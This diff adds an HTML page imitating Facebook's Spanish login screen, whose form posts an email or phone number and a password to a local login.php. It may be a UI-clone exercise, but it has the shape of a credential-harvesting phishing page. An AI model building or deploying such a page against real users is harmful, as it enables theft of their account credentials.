@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Facebook - Iniciar sesión</title>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="info">
+            <h1 class="facebook-logo">facebook</h1>
+            <p>Facebook te ayuda a comunicarte y<br>
+            compartir con las personas que forman<br>
+            parte de tu vida.</p>
+        </div>
+        <div>
+            <div class="login-container">
+                <form action="login.php" method="POST">
+                    <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
+                    <input type="password" name="password" placeholder="Contraseña" required>
+                    <button type="submit">Iniciar sesión</button>
+                </form>
+                <div class="forgot-password">
+                    <p><a href="#">¿Has olvidado la contraseña?</a></p>
+                </div>
+                <hr class="separator">
+                <div class="signup">
+                    <button>Crear cuenta nueva</button>
+                </div>
+            </div>
+            <div class="create-page">
+                <p><a href="#">Crea una página</a> para una celebridad, una marca o un negocio.</p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
